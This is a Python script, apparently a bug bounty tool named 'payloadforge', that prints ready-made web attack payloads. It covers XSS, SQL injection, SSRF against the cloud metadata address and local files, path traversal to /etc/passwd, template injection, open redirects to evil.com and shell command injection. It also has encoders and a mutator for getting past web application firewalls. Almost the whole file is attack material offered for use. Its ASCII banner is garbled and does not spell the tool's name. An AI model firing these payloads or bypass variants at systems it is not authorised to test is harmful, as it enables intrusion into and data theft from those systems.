#!/usr/bin/env python3
# payloadforge - bug bounty payload generator & mutator
# generates payloads for common vuln classes with encoding variants

import sys, argparse, base64, urllib.parse, itertools

C = lambda s,c: f"\033[{c}m{s}\033[0m" if sys.stdout.isatty() else s
B,CY,G,Y,R,D = "1","96","92","93","91","90"

def waf_bypass(p):
    import random
    out = [p]
    # case flip
    out.append("".join(c.upper() if i%2 else c.lower() for i,c in enumerate(p)))
    # comment injection (sql)
    out.append(p.replace(" ", "/**/"))
    # double encode
    out.append(urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""))
    # null byte
    out.append(p + "%00")
    return out

PAYLOADS = {
"xss": [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "\"><script>alert(1)</script>",
  "javascript:alert(1)",
  "<body onload=alert(1)>",
],
"sqli": [
  "' OR '1'='1",
  "' OR 1=1--",
  "' UNION SELECT NULL--",
  "1' AND SLEEP(5)--",
  "' OR '1'='1' /*",
],
"ssrf": [
  "http://169.254.169.254/latest/meta-data/",
  "http://127.0.0.1:80",
  "http://localhost/admin",
  "file:///etc/passwd",
  "gopher://127.0.0.1:6379/_INFO",
],
"lfi": [
  "../../../../etc/passwd",
  "....//....//....//etc/passwd",
  "/etc/passwd%00",
  "php://filter/convert.base64-encode/resource=index.php",
],
"ssti": [
  "{{7*7}}",
  "${7*7}",
  "#{7*7}",
  "<%= 7*7 %>",
  "{{config}}",
],
"redirect": [
  "//evil.com",
  "https://evil.com",
  "/\\evil.com",
  "https:evil.com",
],
"cmdi": [
  "; id",
  "| id",
  "&& id",
  "`id`",
  "$(id)",
],
}

def enc_url(p): return urllib.parse.quote(p, safe="")
def enc_b64(p): return base64.b64encode(p.encode()).decode()
def enc_hex(p): return p.encode().hex()
def enc_double(p): return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
def enc_unicode(p): return "".join(f"\\u{ord(c):04x}" for c in p)

ENCODERS = {
  "url": enc_url, "b64": enc_b64, "hex": enc_hex,
  "double": enc_double, "unicode": enc_unicode, "raw": lambda p: p,
}

def main():
    ap = argparse.ArgumentParser(description="payloadforge - bug bounty payload generator & mutator")
    ap.add_argument("-t","--type", choices=list(PAYLOADS), help="payload type")
    ap.add_argument("-e","--encode", choices=list(ENCODERS), default="raw", help="encoding")
    ap.add_argument("-l","--list", action="store_true", help="list types")
    ap.add_argument("--all", action="store_true", help="all types")
    ap.add_argument("--mutate", action="store_true", help="show all encodings for each payload")
    ap.add_argument("--waf", action="store_true", help="generate WAF-bypass variants")
    args = ap.parse_args()

    if args.list:
        print("Available types:")
        for k,v in PAYLOADS.items():
            print(f"  {k:12} ({len(v)} payloads)")
        return

    types = list(PAYLOADS) if args.all else ([args.type] if args.type else list(PAYLOADS))
    print(C("  ____        _ _           ____", CY))
    print(C(" |  _ \\ __ _| | | ___ _ __ |  _ \\ ___  __ _  __ _ ", CY))
    print(C(" | |_) / _` | | |/ _ \\ '__|| |_) / _ \\/ _` |/ _` |", CY))
    print(C(" |  __/ (_| | | |  __/ |   |  __/  __/ (_| | (_| |", CY))
    print(C(" |_|   \\__,_|_|_|\\___|_|   |_|   \\___|\\__, |\\__,_|", CY))
    print(C("                                      |___/        ", CY))
    print(C(f"  type={','.join(types)}  encode={args.encode}  waf={args.waf}", D))
    print("="*60)
    for t in types:
        print(C(f"\n[{t.upper()}]", CY))
        for p in PAYLOADS[t]:
            if args.waf:
                for v in waf_bypass(p):
                    print(f"  {v}")
            elif args.mutate:
                for name,fn in ENCODERS.items():
                    print(f"  {C(name.ljust(8), D)} {fn(p)}")
            else:
                print(f"  {ENCODERS[args.encode](p)}")

if __name__ == "__main__":
    main()